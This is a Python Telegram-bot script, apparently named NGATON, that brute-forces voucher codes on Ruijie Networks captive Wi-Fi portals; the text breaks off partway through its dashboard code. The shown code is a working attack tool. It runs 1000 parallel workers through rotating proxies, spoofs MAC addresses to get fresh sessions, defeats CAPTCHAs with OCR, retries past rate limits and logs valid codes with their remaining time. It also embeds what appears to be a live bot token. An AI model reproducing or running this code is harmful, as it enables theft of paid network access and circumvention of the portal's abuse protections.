#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
  NGATON
 1000 Workers · Persistent State · Auto-Resume · Time Fix
 FIXED FULL:
  - 2-GET JS redirect follow (proper sid extraction)
  - Minimal headers for SID fetch
  - Clean referer (no RES param, no sessionId)
  - MAX_CODES_PER_SID = 30 (sid reuse — key fix)
  - "request limited" → retry 5x before give up
  - Balance token extraction from voucher response
  - flush=True everywhere for live debug
"""

import os
import sys
import re
import json
import time
import random
import hashlib
import asyncio
import datetime
import traceback
from urllib.parse import (
    urljoin, urlparse, parse_qs, urlencode, urlunparse,
)
from typing import Optional, Tuple, List, Dict, Any

import aiohttp

try:
    from aiohttp_socks import ProxyConnector
    HAS_SOCKS = True
except ImportError:
    HAS_SOCKS = False
    ProxyConnector = None

try:
    import ddddocr
    HAS_OCR = True
except ImportError:
    HAS_OCR = False

try:
    import cv2
    import numpy as np
    HAS_CV2 = True
except ImportError:
    HAS_CV2 = False

from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, filters,
)

# ==============================================================================
#  FORCE UNBUFFERED OUTPUT 
# ==============================================================================

try:
    sys.stdout.reconfigure(line_buffering=True)
    sys.stderr.reconfigure(line_buffering=True)
except Exception:
    pass


def log(*args, **kwargs):
    """Print with automatic flush"""
    kwargs.setdefault("flush", True)
    print(*args, **kwargs)


# ==============================================================================
#  CONFIG
# ==============================================================================

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8909506470:AAHcUxN6YtvYp-cTfDxxFyIlKIr5NKX4o-s")
ADMIN_IDS = [5793831324]
CONTACT_USERNAME = "@Brazzer124"
CONTACT_LINK = "https://t.me/NgaTON_0"

# Files
FILE_PATH = "allinone.txt"
PROXY_FILE = "proxies.txt"
PORTAL_URL_PATH = "portal_url_"
STATE_FILE = "state.json"
TRIED_FILE_TMPL = "tried_{}.txt"

# 1000 WORKER SETTINGS
NUM_WORKERS = 1000
MAX_CODES_PER_SESSION = 500
MAX_CODES_PER_SID = 30          
TIMEOUT_SEC = 15
BALANCE_TIMEOUT = 12
BALANCE_RETRY = 3

USE_PROXY = True
MIN_PROXIES_REQUIRED = 0

SID_RETRY_DELAY = 0.15
SESSION_COOLDOWN = 0.001
NO_PROXY_DELAY = 0.3

CAPTCHA_CACHE_SIZE = 20000

CONNECTOR_LIMIT = 3000
CONNECTOR_LIMIT_PER_HOST = 3000
DNS_CACHE_TTL = 600

#  Persistence intervals
STATE_FLUSH_SEC = 20
CODES_FLUSH_SEC = 15

DEFAULT_PORTAL_BASE = "https://portal-as.ruijienetworks.com"

# ==============================================================================
#  CHARSETS
# ==============================================================================

CHARSET_DIGITS = "0123456789"
CHARSET_ABC = "abcdefghijkmnpqrstuvwxyz"
CHARSET_MIX = "0123456789abcdefghijklmnopqrstuvwxyz"

_T_D = tuple(CHARSET_DIGITS)
_T_A = tuple(CHARSET_ABC)
_T_M = tuple(CHARSET_MIX)

_MODE_SPEC: Dict[str, Tuple[tuple, int]] = {
    "num6": (_T_D, 6), "num7": (_T_D, 7), "num8": (_T_D, 8),
    "num9": (_T_D, 9), "num10": (_T_D, 10),
    "eng6": (_T_A, 6), "eng7": (_T_A, 7), "eng8": (_T_A, 8),
    "mix6": (_T_M, 6), "mix7": (_T_M, 7), "mix8": (_T_M, 8),
    "abc6": (_T_A, 6),
}

MODES = {
    "num6": "🩸 06 • NUM", "num7": "🩸 07 • NUM", "num8": "🩸 08 • NUM",
    "num9": "🩸 09 • NUM", "num10": "🩸 10 • NUM",
    "eng6": "🦇 06 • ENG", "eng7": "🦇 07 • ENG", "eng8": "🦇 08 • ENG",
    "mix6": "💀 06 • MIX", "mix7": "💀 07 • MIX", "mix8": "💀 08 • MIX",
    "abc6": "📜 06 • ABC", "custom": "🔮 Custom",
}

bred = "\x1b[1;31m"
bgreen = "\x1b[1;32m"
yellow = "\x1b[33m"
cyan = "\x1b[1;36m"
reset = "\x1b[0m"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
]

# ==============================================================================
#  GLOBAL STATE
# ==============================================================================

_ocr_instance = None
_proxy_manager: Optional["ProxyManager"] = None
user_scanners: Dict[int, dict] = {}
_captcha_cache: Dict[str, str] = {}
_pending_codes: Dict[int, set] = {}
_state_lock: Optional[asyncio.Lock] = None
_connector_cache: Dict[str, Any] = {}


# ==============================================================================
#  DYNAMIC ENDPOINT HELPERS
# ==============================================================================

def get_portal_base(portal_url: str) -> str:
    if not portal_url:
        return DEFAULT_PORTAL_BASE
    try:
        p = urlparse(portal_url)
        if p.scheme and p.netloc:
            return f"{p.scheme}://{p.netloc}"
    except Exception:
        pass
    m = re.match(r"(https?://[^/]+)", portal_url)
    if m:
        return m.group(1)
    return DEFAULT_PORTAL_BASE


def build_endpoints(portal_url: str) -> Dict[str, str]:
    base = get_portal_base(portal_url)
    return {
        "base": base,
        "index": f"{base}/download/static/maccauth/src/index.html",
        "balance_page": f"{base}/download/static/maccauth/src/balance.html?sessionId=",
        "voucher_url": f"{base}/api/auth/voucher/?lang=en_US",
        "captcha_image": f"{base}/api/auth/captcha/image",
        "captcha_verify": f"{base}/api/auth/captcha/verify",
        "balance_api": f"{base}/api/auth/balance/getBalance/",
    }


# ==============================================================================
#  FILES
# ==============================================================================

def ensure_files_exist() -> None:
    for fname in (FILE_PATH, PROXY_FILE):
        if not os.path.exists(fname):
            try:
                with open(fname, "w"):
                    pass
                log(bgreen + f"[AutoCreate] {fname}" + reset)
            except OSError as e:
                log(bred + f"[AutoCreate] {e}" + reset)


def show_banner() -> None:
    line = "═" * 60
    log(bred + line)
    log("   ⚡  NGATON • 1000W • RESUME  ⚡   ")
    log(f"        Telegram {CONTACT_USERNAME}        ")
    log(line + reset)


# ==============================================================================
#  STATE MANAGEMENT
# ==============================================================================

def get_state_lock():
    global _state_lock
    if _state_lock is None:
        _state_lock = asyncio.Lock()
    return _state_lock


def _load_all_states() -> dict:
    try:
        if not os.path.exists(STATE_FILE):
            return {}
        with open(STATE_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}


def _save_all_states(data: dict) -> None:
    try:
        tmp = STATE_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        os.replace(tmp, STATE_FILE)
    except Exception as e:
        log(bred + f"[State] Save error: {e}" + reset)


def get_saved_state(user_id: int) -> Optional[dict]:
    return _load_all_states().get(str(user_id))


def set_saved_state(user_id: int, data: dict) -> None:
    all_data = _load_all_states()
    all_data[str(user_id)] = data
    _save_all_states(all_data)


def clear_saved_state(user_id: int) -> None:
    all_data = _load_all_states()
    all_data.pop(str(user_id), None)
    _save_all_states(all_data)


def _serialize(state: dict) -> dict:
    hits = []
    for h in state.get("hit_details", []):
        t = h.get("time")
        at = t.strftime("%Y-%m-%d %H:%M:%S") if isinstance(t, datetime.datetime) else str(t)
        hits.append({
            "code": h.get("code", "?"),
            "plan": h.get("plan", "Unknown"),
            "time_str": h.get("time_str", "N/A"),
            "at": at,
        })
    return {
        "url": state.get("portal_url", ""),
        "mode": state.get("mode", "num6"),
        "start_digit": state.get("start_digit"),
        "counter": state.get("counter", 0),
        "tried": state.get("tried", 0),
        "hits": state.get("hits", 0),
        "limits": state.get("limits", 0),
        "net": state.get("net", 0),
        "failed": state.get("failed", 0),
        "last_hit": state.get("last_hit"),
        "started_at": state.get("started_at_str", datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
        "updated_at": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "hit_details": hits,
    }


def _deserialize_hits(hits: list) -> list:
    result = []
    for h in hits:
        try:
            t = datetime.datetime.strptime(h.get("at", ""), "%Y-%m-%d %H:%M:%S")
        except Exception:
            t = datetime.datetime.now()
        result.append({
            "code": h.get("code", "?"),
            "plan": h.get("plan", "Unknown"),
            "time_str": h.get("time_str", "N/A"),
            "time": t,
        })
    return result


def save_state_now(user_id: int, state: dict) -> None:
    try:
        set_saved_state(user_id, _serialize(state))
    except Exception as e:
        log(bred + f"[StateSave] {e}" + reset)


# ==============================================================================
#  TRIED CODES
# ==============================================================================

def _tried_file(user_id: int) -> str:
    return TRIED_FILE_TMPL.format(user_id)


def load_tried_codes(user_id: int) -> set:
    f = _tried_file(user_id)
    if not os.path.exists(f):
        return set()
    try:
        with open(f, "r", encoding="utf-8", errors="ignore") as fp:
            return set(line.strip() for line in fp if line.strip())
    except Exception:
        return set()


def _flush_pending_codes_sync(user_id: int) -> int:
    codes = _pending_codes.get(user_id)
    if not codes:
        return 0
    try:
        with open(_tried_file(user_id), "a", encoding="utf-8") as f:
            for c in codes:
                f.write(f"{c}\n")
        n = len(codes)
        _pending_codes[user_id] = set()
        return n
    except Exception as e:
        log(bred + f"[CodesFlush] {e}" + reset)
        return 0


def clear_tried_codes(user_id: int) -> None:
    _pending_codes.pop(user_id, None)
    try:
        f = _tried_file(user_id)
        if os.path.exists(f):
            os.remove(f)
    except Exception:
        pass


def add_pending_code(user_id: int, code: str) -> None:
    if user_id not in _pending_codes:
        _pending_codes[user_id] = set()
    _pending_codes[user_id].add(code)


# ==============================================================================
#  HIT WRITER
# ==============================================================================

def write_hit(user_id: int, code: str, plan: str, time_str: str) -> None:
    try:
        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(FILE_PATH, "a", encoding="utf-8") as f:
            f.write(f"[{now}] {code} | {plan} | {time_str}\n")
    except Exception as e:
        log(bred + f"[HitWrite] {e}" + reset)


# ==============================================================================
#  BACKGROUND TASKS
# ==============================================================================

async def codes_flusher_loop():
    while True:
        try:
            await asyncio.sleep(CODES_FLUSH_SEC)
            for uid in list(_pending_codes.keys()):
                _flush_pending_codes_sync(uid)
        except asyncio.CancelledError:
            for uid in list(_pending_codes.keys()):
                _flush_pending_codes_sync(uid)
            raise
        except Exception as e:
            log(bred + f"[Flusher] {e}" + reset)


async def state_saver_loop():
    while True:
        try:
            await asyncio.sleep(STATE_FLUSH_SEC)
            for uid, st in list(user_scanners.items()):
                if st.get("running"):
                    save_state_now(uid, st)
        except asyncio.CancelledError:
            for uid, st in list(user_scanners.items()):
                if st.get("running"):
                    save_state_now(uid, st)
            raise
        except Exception as e:
            log(bred + f"[Saver] {e}" + reset)


# ==============================================================================
#  PROXY MANAGER
# ==============================================================================

class ProxyManager:
    def __init__(self, file_path: str) -> None:
        self.file_path = file_path
        self.proxies: List[str] = []
        self.bad_proxies: set = set()
        self.lock = asyncio.Lock()
        self.index = 0
        self.load()

    @staticmethod
    def _normalize(proxy: str) -> Optional[str]:
        proxy = (proxy or "").strip()
        if not proxy or proxy.startswith("#"):
            return None
        if not proxy.startswith(("http://", "https://", "socks4://", "socks5://")):
            proxy = "socks5://" + proxy
        return proxy

    @staticmethod
    def _validate_format(proxy: str) -> bool:
        try:
            rest = proxy.split("://", 1)[1] if "://" in proxy else proxy
            if "@" in rest:
                rest = rest.split("@", 1)[1]
            if ":" not in rest:
                return False
            host, port = rest.rsplit(":", 1)
            if not host or not port:
                return False
            return 1 <= int(port) <= 65535
        except Exception:
            return False

    def load(self) -> None:
        try:
            if not os.path.exists(self.file_path):
                with open(self.file_path, "w"):
                    pass
                self.proxies = []
                return
            with open(self.file_path) as f:
                raw = f.read().splitlines()
            valid = []
            for line in raw:
                p = self._normalize(line)
                if p and self._validate_format(p):
                    valid.append(p)
            seen = set()
            self.proxies = []
            for p in valid:
                if p not in seen:
                    seen.add(p)
                    self.proxies.append(p)
            random.shuffle(self.proxies)
            if self.proxies:
                log(bgreen + f"[Proxy] Loaded {len(self.proxies)}" + reset)
            else:
                log(yellow + "[Proxy] DIRECT MODE" + reset)
        except Exception as e:
            log(bred + f"[Proxy] {e}" + reset)

    def _save_to_file(self) -> None:
        try:
            with open(self.file_path, "w") as f:
                f.write("\n".join(self.proxies))
        except OSError:
            pass

    def add_proxies(self, proxy_lines: List[str]) -> Tuple[int, int]:
        added = invalid = 0
        for line in proxy_lines:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            p = self._normalize(line)
            if not p or not self._validate_format(p):
                invalid += 1
                continue
            if p in self.proxies:
                continue
            self.proxies.append(p)
            added += 1
        if added:
            random.shuffle(self.proxies)
            self._save_to_file()
        return added, invalid

    async def get_next(self) -> Optional[str]:
        async with self.lock:
            if not self.proxies:
                return None
            p = self.proxies[self.index % len(self.proxies)]
            self.index += 1
            return p

    async def mark_bad(self, proxy: Optional[str]) -> None:
        if not proxy:
            return
        async with self.lock:
            self.bad_proxies.add(proxy)

    def get_active_count(self) -> int:
        return len(self.proxies)


def get_proxy_manager() -> ProxyManager:
    global _proxy_manager
    if _proxy_manager is None:
        _proxy_manager = ProxyManager(PROXY_FILE)
    return _proxy_manager


def create_connector_for_proxy(proxy: Optional[str]):
    key = proxy if proxy else "__direct__"
    if key in _connector_cache:
        return _connector_cache[key]

    connector = None
    try:
        if not proxy:
            connector = aiohttp.TCPConnector(
                limit=CONNECTOR_LIMIT,
                limit_per_host=CONNECTOR_LIMIT_PER_HOST,
                ttl_dns_cache=DNS_CACHE_TTL,
                ssl=False,
                enable_cleanup_closed=True,
            )
        elif USE_PROXY and HAS_SOCKS and proxy.startswith(("socks4://", "socks5://")):
            connector = ProxyConnector.from_url(
                proxy, rdns=True,
                limit=CONNECTOR_LIMIT,
                limit_per_host=CONNECTOR_LIMIT_PER_HOST,
                ttl_dns_cache=DNS_CACHE_TTL,
                enable_cleanup_closed=True,
            )
        elif USE_PROXY and HAS_SOCKS:
            connector = ProxyConnector.from_url(
                proxy,
                limit=CONNECTOR_LIMIT,
                limit_per_host=CONNECTOR_LIMIT_PER_HOST,
                ttl_dns_cache=DNS_CACHE_TTL,
                enable_cleanup_closed=True,
            )
    except Exception:
        connector = None

    if connector is not None:
        _connector_cache[key] = connector
    return connector


# ==============================================================================
#  OCR
# ==============================================================================

def get_ocr_instance():
    global _ocr_instance
    if _ocr_instance is None:
        if not HAS_OCR:
            raise RuntimeError("ddddocr not installed")
        _ocr_instance = ddddocr.DdddOcr(show_ad=False)
    return _ocr_instance


def ocr_image_bytes_fast(image_bytes: bytes) -> Optional[str]:
    try:
        result = get_ocr_instance().classification(image_bytes)
        return result.upper() if result else None
    except Exception:
        return None


async def solve_captcha_simple_async(session, captcha_url, headers) -> Optional[str]:
    try:
        async with session.get(
            captcha_url, headers=headers,
            timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC), ssl=False
        ) as resp:
            if resp.status != 200:
                return None
            image_content = await resp.read()
        if not image_content:
            return None
        img_hash = hashlib.md5(image_content).hexdigest()
        cached = _captcha_cache.get(img_hash)
        if cached:
            return cached
        text = await asyncio.to_thread(ocr_image_bytes_fast, image_content)
        if not text:
            return None
        text = text.strip().upper()
        if len(_captcha_cache) < CAPTCHA_CACHE_SIZE:
            _captcha_cache[img_hash] = text
        return text
    except Exception:
        return None


# ==============================================================================
#  USER DATA
# ==============================================================================

def get_user_portal(user_id: int) -> Optional[str]:
    p_file = f"{PORTAL_URL_PATH}{user_id}.txt"
    if os.path.exists(p_file):
        try:
            with open(p_file) as f:
                return f.read().strip() or None
        except OSError:
            pass
    return None


def set_user_portal(user_id: int, url: str) -> None:
    try:
        with open(f"{PORTAL_URL_PATH}{user_id}.txt", "w") as f:
            f.write(url)
    except OSError:
        pass


def generate_random_mac() -> str:
    b = random.choice([0x02, 0x06, 0x0A, 0x0E])
    return ":".join(f"{x:02x}" for x in ([b] + [random.randint(0, 255) for _ in range(5)]))


def replace_mac_urlparse(url: str, new_mac: str) -> str:
    """ FIXED:  — urlparse + urlencode"""
    try:
        u = urlparse(url)
        query = parse_qs(u.query)
        query["mac"] = [new_mac]
        return urlunparse(u._replace(query=urlencode(query, doseq=True)))
    except Exception:
        if "mac=" in url:
            return re.sub(r"(?<=mac=)[^&]+", new_mac, url)
        sep = "&" if "?" in url else "?"
        return f"{url}{sep}mac={new_mac}"


# ==============================================================================
#  GATEWAY —  FIXED: 7.py style 2-GET JS redirect follow + minimal headers
# ==============================================================================

async def get_sid_from_gateway(session, portal_url):
    """
      1. GET spoofed_url (with mac)
      2. If body has location.href=..., do 2nd GET to follow
      3. Parse sessionId / sid from final URL query
    """
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
    }
    try:
        mac = generate_random_mac()
        spoofed_url = replace_mac_urlparse(portal_url, mac)

        async with session.get(
            spoofed_url, headers=headers, allow_redirects=True,
            timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC), ssl=False
        ) as r2:
            body = await r2.text()
            final_url = str(r2.url)

            m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", body)
            if m:
                next_url = urljoin(spoofed_url, m.group(1))
                try:
                    async with session.get(
                        next_url, headers=headers, allow_redirects=True,
                        timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC), ssl=False
                    ) as r3:
                        final_url = str(r3.url)
                        try:
                            body = await r3.text()
                        except Exception:
                            pass
                except Exception:
                    final_url = next_url

        try:
            parsed_q = parse_qs(urlparse(final_url).query)
            sid = parsed_q.get("sessionId", parsed_q.get("sid", [None]))[0]
            if sid:
                return sid, final_url
        except Exception:
            pass

        m = re.search(r"[?&](?:sessionId|sid)=([a-zA-Z0-9]+)", final_url)
        if m:
            return m.group(1), final_url

        m = re.search(r"(?:sessionId|sid)=([a-zA-Z0-9]+)", body)
        if m:
            return m.group(1), final_url

        return None, final_url
    except Exception:
        return None, None


# ==============================================================================
#  TIME PARSING
# ==============================================================================

def _format_time_seconds(total_seconds):
    try:
        total_seconds = float(total_seconds)
        if total_seconds < 0:
            return f"Expired ({int(total_seconds // 60)}m)"
        m = int(total_seconds // 60)
        if m < 1:
            return f"{int(total_seconds)}s"
        h, mm = divmod(m, 60)
        return f"{h}h {mm}m" if h else f"{mm}m"
    except Exception:
        return "N/A"


def _parse_time_value(value):
    if value is None:
        return None
    try:
        num = float(value)
        return _format_time_seconds(num * 60) if num < 100000 else _format_time_seconds(num)
    except (ValueError, TypeError):
        pass
    s = str(value).strip().lower()
    if not s or s in ("n/a", "null", "none", "-", ""):
        return None
    if "expired" in s:
        return s.replace("expired", "Expired")
    if re.match(r"^\d+\s*h", s) or re.match(r"^\d+\s*m", s):
        return s
    for pat, u in [(r"^(\d+)\s*(hour|hours|hr|hrs|h)$", "h"),
                   (r"^(\d+)\s*(minute|minutes|min|mins|m)$", "m"),
                   (r"^(\d+)\s*(second|seconds|sec|secs|s)$", "s"),
                   (r"^(\d+)\s*(day|days|d)$", "d")]:
        m = re.match(pat, s)
        if m:
            return f"{m.group(1)}{u}"
    m = re.match(r"^(\d+)\s*(month|months|mo)$", s)
    if m:
        return f"{int(m.group(1)) * 30}d"
    try:
        num = float(s)
        return _format_time_seconds(num * 60) if num < 100000 else _format_time_seconds(num)
    except ValueError:
        pass
    return s if s else None


def _deep_find_time(obj, depth=0):
    if depth > 5:
        return None
    if isinstance(obj, dict):
        for f in ["remainingMinutes", "remainMinutes", "remainingTime", "remainTime",
                  "balance", "remaining", "timeRemaining", "remainingSeconds",
                  "remainSeconds", "totalMinutes", "totalTime", "time", "duration", "expireTime"]:
            if f in obj:
                p = _parse_time_value(obj[f])
                if p:
                    return p
        for v in obj.values():
            if isinstance(v, (dict, list)):
                x = _deep_find_time(v, depth + 1)
                if x:
                    return x
    elif isinstance(obj, list):
        for it in obj:
            x = _deep_find_time(it, depth + 1)
            if x:
                return x
    return None


def _deep_find_plan(obj, depth=0):
    if depth > 5:
        return None
    if isinstance(obj, dict):
        for f in ["profileName", "planName", "plan", "profile", "packageName",
                  "package", "voucherName", "voucherType", "type", "name", "userGroup"]:
            if f in obj:
                v = obj[f]
                if v and isinstance(v, str) and v.strip():
                    return v.strip()
        for v in obj.values():
            if isinstance(v, (dict, list)):
                x = _deep_find_plan(v, depth + 1)
                if x:
                    return x
    elif isinstance(obj, list):
        for it in obj:
            x = _deep_find_plan(it, depth + 1)
            if x:
                return x
    return None


# ==============================================================================
#  BALANCE —  FIXED: use token from voucher response (fallback sid)
# ==============================================================================

async def fetch_balance_reuse_session(session, active_token, proxy, portal_base):
    if not active_token:
        return "Unknown", "N/A"
    balance_page = f"{portal_base}/download/static/maccauth/src/balance.html?sessionId={active_token}&lang=en_US"
    balance_url = f"{portal_base}/api/auth/balance/getBalance/{active_token}"
    headers = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json;",
        "user-agent": random.choice(USER_AGENTS),
        "x-requested-with": "XMLHttpRequest",
        "referer": balance_page,
    }
    try:
        async with session.get(balance_page,
            timeout=aiohttp.ClientTimeout(total=BALANCE_TIMEOUT),
            ssl=False, allow_redirects=True) as _:
            pass
    except Exception:
        pass

    for attempt in range(BALANCE_RETRY):
        try:
            async with session.get(balance_url, headers=headers,
                timeout=aiohttp.ClientTimeout(total=BALANCE_TIMEOUT),
                ssl=False) as resp:
                if resp.status != 200:
                    await asyncio.sleep(0.3)
                    continue
                try:
                    data = await resp.json(content_type=None)
                except Exception:
                    try:
                        text = await resp.text()
                        data = json.loads(text)
                    except Exception:
                        await asyncio.sleep(0.3)
                        continue
                if not data:
                    await asyncio.sleep(0.3)
                    continue
                plan = _deep_find_plan(data) or "Unknown"
                ts = _deep_find_time(data)
                if ts:
                    return plan, ts
                if plan != "Unknown" and attempt < BALANCE_RETRY - 1:
                    await asyncio.sleep(0.4)
                    continue
                return plan, "N/A"
        except Exception:
            await asyncio.sleep(0.3)
            continue
    return "Unknown", "N/A"


# ==============================================================================
#  CHECKER —  FIXED: "request limited" retry 5x + returns (result, body)
# ==============================================================================

async def check_single_access_code(session, code, sid, endpoints, proxy):
    """
     seven.py style:
      - Clean referer (no RES, no sessionId)
      - Retry 5x on "request limited"
      - Return (result, body)
    """
    if not sid:
        return "net", None

    base = endpoints["base"]
    referer = f"{base}/download/static/maccauth/src/index.html"   

    retry_count = 0
    max_retries = 5

    while retry_count < max_retries:
        try:
            captcha_url = f"{endpoints['captcha_image']}?sessionId={sid}&_t={int(time.time() * 1000)}"
            img_headers = {
                "accept": "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
                "accept-language": "en-US,en;q=0.9",
                "referer": referer,
                "sec-fetch-dest": "image",
                "sec-fetch-mode": "no-cors",
                "sec-fetch-site": "same-origin",
                "user-agent": random.choice(USER_AGENTS),
            }
            captcha_text = await solve_captcha_simple_async(session, captcha_url, img_headers)
            if not captcha_text or len(captcha_text) < 2:
                retry_count += 1
                continue

            v_headers = {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "origin": base,
                "referer": referer,
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": random.choice(USER_AGENTS),
            }
            async with session.post(
                endpoints["captcha_verify"],
                json={"sessionId": sid, "authCode": captcha_text},
                headers=v_headers,
                timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC), ssl=False
            ) as v_resp:
                v_body = await v_resp.text()

            verified = False
            try:
                if json.loads(v_body).get("success") is True:
                    verified = True
            except Exception:
                if '"success":true' in v_body.replace(" ", ""):
                    verified = True
            if not verified:
                retry_count += 1
                continue

            async with session.post(
                endpoints["voucher_url"],
                json={"accessCode": code, "sessionId": sid,
                      "apiVersion": 1, "authCode": captcha_text},
                headers=v_headers,
                timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC), ssl=False
            ) as l_resp:
                body = await l_resp.text()

            low = body.lower()

            if '"success":true' in body.replace(" ", ""):
                return "hit", body

            if "request limited" in low:
                retry_count += 1
                if retry_count < max_retries:
                    continue
                return "limit", body

            if "exceeds the limit" in low or "the number of sta" in low:
                return "limit", body

            if "expired" in low:
                return "expired", body

            return "bad", body

        except (asyncio.TimeoutError, aiohttp.ClientError, OSError):
            return "net", None
        except asyncio.CancelledError:
            raise
        except Exception:
            return "net", None

    return "failed", None


def make_code(mode, counter=None):
    if mode == "custom" and counter is not None:
        return str(counter).zfill(6)
    spec = _MODE_SPEC.get(mode) or _MODE_SPEC["num6"]
    charset, length = spec
    return "".join(random.choices(charset, k=length))


# ==============================================================================
#  WORKER —  FIXED: sid reuse 30 codes
# ==============================================================================

async def worker(worker_id, headers_unused, user_id):
    pm = get_proxy_manager()
    state = user_scanners.get(user_id)
    if state is None:
        return

    stop_event = state["stop_event"]
    mode = state.get("mode", "num6")
    tried_codes = state["tried_codes"]
    endpoints = state["endpoints"]

    while not stop_event.is_set():
        proxy = await pm.get_next()
        connector = create_connector_for_proxy(proxy)

        session = None
        try:
            session = aiohttp.ClientSession(
                connector=connector,
                connector_owner=False,
                cookie_jar=aiohttp.CookieJar(),
                timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC),
                headers={"user-agent": random.choice(USER_AGENTS)},
            )

            sid = None
            codes_this_sid = 0
            sid_failures = 0
            session_codes = 0

            while not stop_event.is_set() and session_codes < MAX_CODES_PER_SESSION:
                #  FIXED: reuse sid until MAX_CODES_PER_SID
                if sid is None or codes_this_sid >= MAX_CODES_PER_SID:
                    new_sid, _ = await get_sid_from_gateway(session, state["portal_url"])
                    if not new_sid:
                        sid_failures += 1
                        state["net"] += 1
                        state["recent_logs"].append("⚠️ SID RETRY")
                        if sid_failures >= 3:
                            await pm.mark_bad(proxy)
                            break
                        await asyncio.sleep(SID_RETRY_DELAY)
                        continue
                    sid = new_sid
                    codes_this_sid = 0
                    sid_failures = 0

                if len(tried_codes) > 500_000:
                    state["tried_codes"] = set()
                    tried_codes = state["tried_codes"]

                code = None
                for _ in range(50):
                    if mode == "custom":
                        state["counter"] += 1
                        code = make_code(mode, state["counter"])
                    else:
                        code = make_code(mode)
                    if code not in tried_codes:
                        break
                if code is None:
                    if mode == "custom":
                        continue
                    break

                tried_codes.add(code)
                add_pending_code(user_id, code)
                state["current_code"] = code

                result, body = await check_single_access_code(
                    session, code, sid, endpoints, proxy
                )
                codes_this_sid += 1
                session_codes += 1
                state["tried"] += 1

                if result == "hit":
                    state["hits"] += 1
                    state["hit_list"].append(code)
                    state["last_hit"] = code
                    state["recent_logs"].append(f"🔥 HIT: {code}")

                    # FIXED: extract token from voucher response
                    active_token = sid
                    if body:
                        m = re.search(r'token=([^&\s"\'<>]+)', body, re.IGNORECASE)
                        if m:
                            active_token = m.group(1)

                    plan_name, time_str = await fetch_balance_reuse_session(
                        session, active_token, proxy, endpoints["base"]
                    )
                    state["hit_details"].append({
                        "code": code, "time": datetime.datetime.now(),
                        "plan": plan_name, "time_str": time_str,
                    })
                    write_hit(user_id, code, plan_name, time_str)
                    _flush_pending_codes_sync(user_id)
                    save_state_now(user_id, state)

                elif result == "limit":
                    state["limits"] += 1
                    state["recent_logs"].append(f"⚠️ LIMIT: {code}")
                    sid = None

                elif result == "captcha":
                    state["failed"] += 1
                    sid = None

                elif result == "net":
                    state["net"] += 1
                    sid = None
                    break

                elif result == "expired":
                    state["failed"] += 1

                else:
                    state["failed"] += 1

                if stop_event.is_set():
                    break
                await asyncio.sleep(SESSION_COOLDOWN)

        except asyncio.CancelledError:
            raise
        except Exception:
            state["net"] += 1
        finally:
            if session is not None:
                try:
                    await session.close()
                except Exception:
                    pass

        if stop_event.is_set():
            break


# ==============================================================================
#  DASHBOARD 
# ==============================================================================

def _build_hit_section(hit_details, total_hits, final=False, max_show=90):
    lines = []
    for hd in hit_details:
        c = hd.get('code', '?')
        p = hd.get('plan', '?')
        ts = hd.get('time_str', '?')
        if final:
            lines.append(f"  ▸ <code>{c}</code>  🗡️ {p}  ⏳ {ts}")
        else:
            lines.append(f"  ▸ <code>{c}</code>  •  {p}  •  {ts}")
    if lines:
        if len(lines) > max_show:
            hidden = len(lines) - max_show
            lines = [f"  … +{hidden} more"] + lines[-max_show:]
        body = "\n".join(lines)
    else:
        body = "  💀 No hits yet" if not final else "  💀 No hits"
    return (f"🎁 <b>HITS • {total_hits}</b>\n"
            "┌───────────────────────┐\n"
            f"{body}\n"
            "└───────────────────────┘")


async def live_dashboard_updater(context, user_id):
    state = user_scanners.get(user_id)
    if state is None:
        return
    stop_event = state["stop_event"]
    dash_msg_id = state.get("dash_msg_id")
    pm = get_proxy_manager()
    try:
        while not stop_event.is_set():
            await asyncio.sleep(5)
            if stop_event.is_set():
                break
            elapsed = max(time.time() - state["start_time"], 1)
            speed_cpm = int(state["tried"] / elapsed * 60)
            active = pm.get_active_count()
            recent_logs = state["recent_logs"][-1:] if state["recent_logs"] else ["idle"]
            last_log = recent_logs[-1]
            hit_section = _build_hit_section(state.get("hit_details", []), state["hits"])
            proxy_mode = f"🕷️ {active}" if active > 0 else "⚡ DIRECT"

            text = (
                "╔═════════════════════════╗\n"
                "║   ⚡ <b>NGATON SCANNER</b> ⚡   ║\n"
